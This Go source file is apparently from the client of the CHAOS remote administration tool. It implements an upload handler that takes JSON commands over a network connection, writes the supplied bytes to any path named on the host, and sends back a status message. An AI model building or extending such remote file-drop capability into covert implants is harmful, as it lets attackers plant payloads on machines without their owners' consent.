package upload

import (
	"encoding/json"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	osUtil "github.com/tiagorlampert/CHAOS/client/app/util/os"
	"net"
	"os"
	"path/filepath"
)

type UploadUseCase struct {
	Connection net.Conn
}

func NewUploadUseCase(conn net.Conn) usecase.Upload {
	return &UploadUseCase{
		Connection: conn,
	}
}

func (u UploadUseCase) File(data []byte) {
	var errMsg models.Error

	var upload models.Upload
	if err := json.Unmarshal(data, &upload); err != nil {
		log.Error(err)
		errMsg.HasError = true
		errMsg.Message = err.Error()
	}

	dir, _ := filepath.Split(upload.FilepathTo)
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		log.Error(err)
		errMsg.HasError = true
		errMsg.Message = err.Error()
	}

	if !errMsg.HasError {
		if err := osUtil.WriteFile(upload.FilepathTo, upload.Data); err != nil {
			log.Error(err)
			errMsg.HasError = true
			errMsg.Message = err.Error()
		}
	}

	if err := network.Send(u.Connection, models.Message{
		Command: "upload",
		Error:   errMsg,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending upload response")
	}
}
